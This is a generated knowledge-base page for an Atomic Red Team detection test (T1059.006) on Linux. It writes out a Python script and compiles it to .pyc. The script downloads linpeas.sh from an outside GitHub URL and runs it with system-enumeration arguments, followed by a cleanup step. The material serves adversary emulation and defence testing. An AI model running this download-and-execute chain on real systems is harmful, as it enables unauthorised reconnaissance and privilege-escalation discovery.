---
atomic_guid: "0b44d79b-570a-4b27-a31f-3bf2156e5eaa"
title: "Execute Python via Python executables"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.006"
attack_technique_name: "Command and Scripting Interpreter: Python"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml"
build_date: "2026-04-26 14:38:39"
executor: "sh"
aliases:
  - "0b44d79b-570a-4b27-a31f-3bf2156e5eaa"
  - "Execute Python via Python executables"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Execute Python via Python executables

Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments

## Metadata

- Atomic GUID: 0b44d79b-570a-4b27-a31f-3bf2156e5eaa
- Technique: T1059.006: Command and Scripting Interpreter: Python
- Platforms: linux
- Executor: sh
- Dependency Executor: sh
- Source Path: atomics/T1059.006/T1059.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.006]]

## Input Arguments

### executor

- description: Payload or script interpreter / executor
- type: string
- default: sh

### payload_file_name

- description: Shell script file name downloaded from the script_url
- type: string
- default: T1059.006-payload

### python_binary_name

- description: Name of Python file to be compiled
- type: path
- default: T1059.006.pyc

### python_script_name

- description: Name of Python script name
- type: path
- default: T1059.006.py

### script_args

- description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files
- type: string
- default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles

### script_url

- description: URL hosting external malicious payload
- type: string
- default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh

## Dependencies

Requires Python

### Prerequisite Check

```text
which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?
```

### Get Prerequisite

```text
pip install requests
```

## Executor

- name: sh

### Command

```sh
which_python=$(which python || which python3 || which python3.9 || which python2)
echo 'import requests' > #{python_script_name}
echo 'import os' >> #{python_script_name}
echo 'url = "#{script_url}"' >> #{python_script_name}
echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
echo 'session = requests.session()' >> #{python_script_name}
echo 'source = session.get(url).content' >> #{python_script_name}
echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
echo 'fd.write(source)' >> #{python_script_name}
echo 'fd.close()' >> #{python_script_name}
echo 'os.system(malicious_command)' >> #{python_script_name}
$which_python -c 'import py_compile; py_compile.compile("#{python_script_name}", "#{python_binary_name}")'
$which_python #{python_binary_name}
```

### Cleanup

```sh
rm #{python_binary_name} #{python_script_name} #{payload_file_name}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml)
